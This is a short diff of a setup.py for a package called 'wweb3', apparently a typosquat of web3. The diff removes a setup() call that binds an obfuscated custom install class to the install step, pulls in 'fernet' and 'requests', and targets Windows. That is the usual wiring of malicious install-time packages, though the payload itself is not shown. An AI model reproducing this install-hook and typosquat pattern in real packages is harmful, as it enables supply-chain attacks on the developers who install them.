@@ -18,22 +18,5 @@ class LFFTibVVisxyukKtCRPwfLZnHzslWtlYLFSFpPKTAfmuJSadaqNiVtrYTOWJywfUBGJyZsxXRs
             install.run(self)
 
 
-setup(
-    name="wweb3",
-    version=VERSION,
-    author="VaABtFCrmtswQFqH",
-    author_email="sIlsAiUdMQOCIyi@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': LFFTibVVisxyukKtCRPwfLZnHzslWtlYLFSFpPKTAfmuJSadaqNiVtrYTOWJywfUBGJyZsxXRshyMcVQnPMAU,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     
 
